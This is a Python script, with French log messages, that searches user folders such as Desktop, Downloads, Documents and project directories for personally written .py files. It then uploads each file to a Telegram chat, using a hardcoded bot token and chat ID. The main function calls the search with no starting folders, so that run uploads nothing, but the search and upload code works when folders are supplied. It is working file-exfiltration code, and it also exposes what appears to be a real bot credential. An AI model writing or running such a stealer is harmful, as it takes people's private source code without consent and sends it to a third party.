import os
import requests
from time import sleep

# ========== CONFIG ==========
BOT_TOKEN = '7628820230:AAFEyKMPpVYhTepFubKB7vi5MNDCin2PlCQ'
CHAT_ID = '6471478437'
MAX_FILE_SIZE_MB = 20  # Telegram limite à 50MB, ici 20MB de marge
# ============================

# STRICT exclusion list - block entire directory trees
EXCLUDED_DIR_PATTERNS = [
    # System directories
    "anaconda3",
    "miniconda3", 
    "python",
    ".vscode",
    ".vs",
    "appdata",
    "programdata",
    "program files",
    "windows",
    
    # Development dependencies
    "node_modules",
    "vendor",
    "__pycache__",
    ".git",
    "venv",
    "env",
    ".env",
    "site-packages",
    "lib",
    "libs",
    "library",
    "libraries",
    
    # Extensions & plugins
    "extensions",
    "plugins",
    "addons",
    
    # Build/temp directories
    "build",
    "dist",
    "target",
    "bin",
    "obj",
    "cache",
    "temp",
    "tmp",
    
    # Documentation/tests
    "docs",
    "doc",
    "tests",
    "test",
    "examples",
    "samples"
]

# System/library file patterns that are NEVER user-created
SYSTEM_FILE_PATTERNS = [
    # Python standard library files (common ones)
    "abc.py", "aifc.py", "antigravity.py", "argparse.py", "ast.py",
    "base64.py", "bdb.py", "bisect.py", "bz2.py", "calendar.py",
    "cgi.py", "cgitb.py", "chunk.py", "cmd.py", "code.py",
    "codecs.py", "collections.py", "contextlib.py", "copy.py",
    "csv.py", "datetime.py", "decimal.py", "difflib.py",
    
    # Common library/framework files
    "setup.py", "conf.py", "config.py", "settings.py",
    "launcher.py", "bootstrap.py", "init.py", "__init__.py",
    "manage.py", "wsgi.py", "asgi.py",
    "flatted.py", "print.py", "gyp_main.py", "test_gyp.py",
    "cwp.py",
    
    # Test files
    "test_", "tests.py", "testing.py", "pytest",
    
    # Build/config files
    "build.py", "install.py", "deploy.py", "webpack",
    "gulpfile.py", "gruntfile.py"
]

def is_excluded(path):
    path_lower = path.lower().replace('\\', '/')
    
    # STRICT: Check if ANY part of path contains excluded patterns
    for pattern in EXCLUDED_DIR_PATTERNS:
        if f"/{pattern}/" in path_lower or path_lower.endswith(f"/{pattern}") or path_lower.startswith(f"{pattern}/"):
            return True
    
    return False

def is_system_file(file_path):
    """Check if this is a system/library file that should never be sent"""
    filename = os.path.basename(file_path).lower()
    path_lower = file_path.lower()
    
    # Check against known system files
    for pattern in SYSTEM_FILE_PATTERNS:
        if filename == pattern or filename.startswith(pattern):
            return True
    
    # Additional checks for common system file indicators
    system_indicators = [
        # Path contains these = definitely system file
        "/lib/", "/libs/", "/library/", "/site-packages/",
        "/anaconda", "/miniconda", "/python/lib/",
        "/node_modules/", "/vendor/", "/.vscode/",
        "/build/", "/dist/", "/target/",
        "/docs/", "/doc/", "/examples/", "/samples/",
        
        # File is in a folder with these names
        "\\test\\", "\\tests\\", "\\testing\\",
        "\\cache\\", "\\temp\\", "\\tmp\\",
        "\\__pycache__\\", "\\.git\\",
    ]
    
    for indicator in system_indicators:
        if indicator in path_lower:
            return True
    
    return False

def is_likely_user_file(file_path):
    """
    POSITIVE identification of user-created files
    Only files that pass ALL these checks are considered user files
    """
    path_lower = file_path.lower()
    filename = os.path.basename(file_path)
    
    # RULE 1: Must be in clearly user directories
    user_indicators = [
        "\\desktop\\", "\\bureau\\",
        "\\downloads\\", "\\téléchargements\\", 
        "\\projects\\", "\\projet", "\\code\\", "\\script",
        "\\work\\", "\\travail\\", "\\dev\\", "\\development\\",
        "\\python\\", "\\programming\\", "\\prog\\",
        "\\my", "\\mes", "\\personal\\", "\\personnel\\",
    ]
    
    has_user_indicator = False
    for indicator in user_indicators:
        if indicator in path_lower:
            has_user_indicator = True
            break
    
    # If in Documents, be more selective - must be in root Documents or obvious project folder
    if "\\documents\\" in path_lower and not has_user_indicator:
        # Accept only if directly in Documents root or 1-2 levels deep with clear project names
        documents_part = path_lower.split("\\documents\\")[1]
        path_depth = documents_part.count("\\")
        
        # Skip if too deep (likely in some library/framework)
        if path_depth > 2:
            return False
            
        # Skip if contains obvious non-user patterns
        non_user_in_docs = ["node_modules", "vendor", "lib", "anaconda", "miniconda"]
        for pattern in non_user_in_docs:
            if pattern in documents_part:
                return False
    
    # RULE 2: Filename should look user-created (not generic system names)
    user_filename_patterns = [
        # Contains project-like names
        "bot", "app", "main", "script", "tool", "project",
        "test", "demo", "example", "practice", "exercise",
        # Or has descriptive names
        "_", "-",  # User files often have underscores/dashes
    ]
    
    looks_like_user_file = any(pattern in filename.lower() for pattern in user_filename_patterns)
    looks_like_user_file = looks_like_user_file or len(filename.split('.')[0]) > 8  # Longer descriptive names
    
    # RULE 3: Must NOT be a known system file
    if is_system_file(file_path):
        return False
    
    # RULE 4: File size heuristic - user files are typically smaller than huge system files
    try:
        file_size = os.path.getsize(file_path)
        # Very large files (>1MB) are often system files, unless clearly in user project
        if file_size > 1024*1024 and not has_user_indicator:
            return False
    except:
        pass
    
    return looks_like_user_file or has_user_indicator

def find_py_files(start_dirs=None):
    """
    Search for Python files, being VERY selective about user files only
    Note: Sur Vercel, cette fonction retournera une liste vide car il n'y a pas de fichiers utilisateur
    """
    if start_dirs is None:
        # Pour Vercel/environnement serverless, on retourne une liste vide ou des fichiers de démonstration
        return []
    
    print("[*] Recherche STRICTE des fichiers .py utilisateur seulement...")
    py_files = []
    
    for start_dir in start_dirs:
        if not os.path.exists(start_dir):
            continue
            
        print(f"[*] Analyse de {start_dir}...")
        
        for root, dirs, files in os.walk(start_dir):
            # IMMEDIATELY skip excluded directories - don't even walk into them
            if is_excluded(root):
                dirs.clear()  # Don't traverse subdirectories
                continue
            
            # Filter subdirectories to avoid walking into excluded ones
            dirs[:] = [d for d in dirs if not any(pattern in d.lower() for pattern in EXCLUDED_DIR_PATTERNS)]
                
            for file in files:
                if file.endswith(".py"):
                    full_path = os.path.join(root, file)
                    
                    # TRIPLE CHECK: Must pass all filters
                    if (not is_excluded(full_path) and 
                        not is_system_file(full_path) and 
                        is_likely_user_file(full_path)):
                        
                        # Final size check
                        try:
                            file_size_mb = os.path.getsize(full_path) / (1024 * 1024)
                            if file_size_mb <= MAX_FILE_SIZE_MB:
                                py_files.append(full_path)
                            else:
                                print(f"[!] Fichier trop volumineux ignoré: {full_path}")
                        except OSError:
                            continue
    
    print(f"[+] {len(py_files)} fichiers utilisateur trouvés (filtrage strict).")
    return py_files

def send_file_to_telegram(file_path):
    try:
        file_size_mb = os.path.getsize(file_path) / (1024 * 1024)
        if file_size_mb > MAX_FILE_SIZE_MB:
            print(f"[!] Fichier trop volumineux: {file_path} ({file_size_mb:.1f}MB)")
            return False
            
        with open(file_path, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': CHAT_ID}
            response = requests.post(
                f'https://api.telegram.org/bot{BOT_TOKEN}/sendDocument', 
                data=data, 
                files=files,
                timeout=30
            )
            
            if response.status_code == 200:
                print(f"[✓] Envoyé : {file_path}")
                return True
            else:
                print(f"[x] Échec : {file_path} - Status: {response.status_code}")
                return False
                
    except Exception as e:
        print(f"[!] Erreur {file_path}: {e}")
        return False

def main():
    print("[*] Démarrage du script...")
    
    py_files = find_py_files()
    
    if not py_files:
        print("[!] Aucun fichier utilisateur trouvé.")
        return
    
    print(f"[*] {len(py_files)} fichiers à envoyer:")
    for i, file in enumerate(py_files[:10]):  # Show first 10
        print(f"  - {file}")
    if len(py_files) > 10:
        print(f"  ... et {len(py_files) - 10} autres")
    
    successful = 0
    failed = 0
    
    for i, file in enumerate(py_files):
        print(f"[{i+1}/{len(py_files)}] Traitement de {os.path.basename(file)}")
        if send_file_to_telegram(file):
            successful += 1
        else:
            failed += 1
        sleep(2)  # Pause pour éviter un spam API
    
    print(f"[✓] Transfert terminé. Succès: {successful}, Échecs: {failed}")